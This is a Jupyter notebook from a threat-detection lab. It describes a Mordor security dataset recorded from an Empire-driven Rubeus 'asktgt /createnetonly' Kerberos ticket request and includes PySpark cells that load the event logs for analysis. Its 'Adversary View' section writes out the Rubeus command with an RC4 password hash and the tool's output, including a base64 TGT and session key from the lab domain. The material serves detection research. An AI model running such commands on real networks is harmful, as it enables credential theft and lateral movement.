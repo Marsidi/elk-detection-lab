{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Rubeus ASKTGT CreateNetOnly"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190319151006 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/03/19 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/GhostPack/Rubeus |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_rubeus_asktgt_ptt_createnetonly.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: G6BYHU4F) > shell Rubeus.exe asktgt /user:Mmidge /rc4:b415baa073a14f81f8c89a2a384f4a68 /createnetonly:C:\\Windows\\System32\\cmd.exe\n",
    "[*] Tasked G6BYHU4F to run TASK_SHELL\n",
    "[*] Agent G6BYHU4F tasked with task ID 5.5.exe asktgt /user:Mmidge /d \n",
    "(Empire: G6BYHU4F) > ______        _                      \n",
    "  (_____ \\      | |                     \n",
    "  _____) )_   _| |__  _____ _   _  ___ \n",
    "  |  __  /| | | |  _ \\| ___ | | | |/___)\n",
    "  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n",
    "  |_|   |_|____/|____/|_____)____/(___/\n",
    "\n",
    "  v1.4.2 \n",
    "\n",
    "\n",
    "[*] Action: Create Process (/netonly)\n",
    "\n",
    "[*] Showing process : False\n",
    "[+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\n",
    "[+] ProcessID       : 8148\n",
    "[+] LUID            : 0x53b3d71\n",
    "\n",
    "[*] Action: Ask TGT\n",
    "\n",
    "[*] Using rc4_hmac hash: b415baa073a14f81f8c89a2a384f4a68\n",
    "[*] Target LUID : 87768433\n",
    "[*] Using domain controller: HFDC01.shire.com (172.18.39.5)\n",
    "[*] Building AS-REQ (w/ preauth) for: 'shire.com\\Mmidge'\n",
    "[+] TGT request successful!\n",
    "[*] base64(ticket.kirbi):\n",
    "\n",
    "      doIE5DCCBOCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+KADAgEFoQsbCVNISVJFLkNPTaIeMBygAwIB\n",
    "      AqEVMBMbBmtyYnRndBsJc2hpcmUuY29to4IDwjCCA76gAwIBEqEDAgECooIDsASCA6yEK7banoUxPpUq\n",
    "      EoMNXT5YSlapCf/5ejnJ9j73z2CC1V54tAWP6wWOUkw1o5EWzeYqywcEhXsQVW/zC0fUk9f05GnMTINY\n",
    "      fK1yBdXTeUK2EL53Fq7CJkhKQdFxuNe80oROsp55hO9l4YwtHyNT6hxMuvcOO24dgB/1esaQJd0IqwRM\n",
    "      wICi6t/RS9Ac7PKOzXIyojGvTFI/zneR55Z0g7x+CJWN6FUO5zWG8QrCt2wAcWvvv0TusvK2Zkd3JHJ1\n",
    "      pTpSf6WlGK8EH5aExqTUAznFynXebqBPdmvgSkkJf6U/Z/Dy7U6KIojujr9/vyhdLUzAtVfyc3tUGZQS\n",
    "      n63UXkEVbadKNZ5m/SFr3cwNEeG9hyvyisfJMhm49fVDdEVbHrXrZfNZN5a1cqbbSkJezII0AgV9rP9J\n",
    "      PUgE8FMbfBL1gwyPZDu1PgYO0UuxJMQg4Kb1JIBjOsCx2Q9yuKXPM9wKccF4ys0qYxw5kzV/ujZIgvAS\n",
    "      XJwzlFSegjprZxljUzI5k9LDnFz7RXATScg0un0KUCHuSFsnvhHAbxe12xbEYWDG3vVu3k7uN2kkoUcb\n",
    "      xbGq2kcu/ayDJc50uSIXxwR87n1Cqt6wtydk79460C8EKwONd8VT8cbmuwlQQvQ4uz1eeS0D4TOshOlx\n",
    "      wm/dG4CZ/asRDkKu2iZWi5tBrMS2lSPxP5QLvbiYdBhIcbZrrjtFjJ9O2cxhYolj+sE01cbQx3HKR9mm\n",
    "      rx8k5buBdLyWIWy9RzkRPytqiWYdXyNmfdkVFUNI/YoP39mJX+Pu07eS76F72VEzie+c24o9YRe/1Ma6\n",
    "      FOZYNXypbgswOz6vVTKX9ItSp6nUHhDwJ5YH+QJsu3HcNqcUBCi5fwDCHkaXXx+YwJLNohuckQaDa2L/\n",
    "      NlZM7ZL+Q5GSZ27NCYlPsvmTNmGN/gVYKMJqJor2BF7KdS/Cg6w76tm+4nOCe8pCEG3pfOofLAeNGFNk\n",
    "      QGhGwyqb9G3Lx9MhLyrBhkJtmol3FKd8dm/7r/g9bKndVGejwa0DdsxesNCzOhZCpL2rChz5+ty2vvKi\n",
    "      FQi+iuAqKR9ANqaZ2VJx8qGsmOi+Qr7rEo0dm9rVIrOwa96CCFjWIUzDbN0goMuaRaMcv8zp4NRmfSUQ\n",
    "      Hsoiymm8U7yjh3JuURc7AEbQFrACIiDiBvLP8pZca483tchXlkXy+haf0vpc+t+W3IeXwI3PQOjGwTnC\n",
    "      wbjaT5LGn4uc5rIQuN4QQt/+1T7xJhYvA7NMnyqho4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEw\n",
    "      ga6gGzAZoAMCARehEgQQfcfUVG4dvCBEsY+L2tRNMaELGwlTSElSRS5DT02iEzARoAMCAQGhCjAIGwZN\n",
    "      bWlkZ2WjBwMFAEDhAAClERgPMjAxOTAzMTkxOTEzMjRaphEYDzIwMTkwMzIwMDUxMzI0WqcRGA8yMDE5\n",
    "      MDMyNjE5MTMyNFqoCxsJU0hJUkUuQ09NqR4wHKADAgECoRUwExsGa3JidGd0GwlzaGlyZS5jb20=\n",
    "\n",
    "[*] Action: Import Ticket\n",
    "[*] Target LUID: 0x53b3d71\n",
    "[+] Ticket successfully imported!\n",
    "\n",
    "[*] Action: Describe Ticket\n",
    "\n",
    "  UserName              :  Mmidge\n",
    "  UserRealm             :  SHIRE.COM\n",
    "  ServiceName           :  krbtgt/shire.com\n",
    "  ServiceRealm          :  SHIRE.COM\n",
    "  StartTime             :  3/19/2019 2:13:24 PM\n",
    "  EndTime               :  3/20/2019 12:13:24 AM\n",
    "  RenewTill             :  3/26/2019 2:13:24 PM\n",
    "  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n",
    "  KeyType               :  rc4_hmac\n",
    "  Base64(key)           :  fcfUVG4dvCBEsY+L2tRNMQ==\n",
    "\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: G6BYHU4F) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_rubeus_asktgt_ptt_createnetonly.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
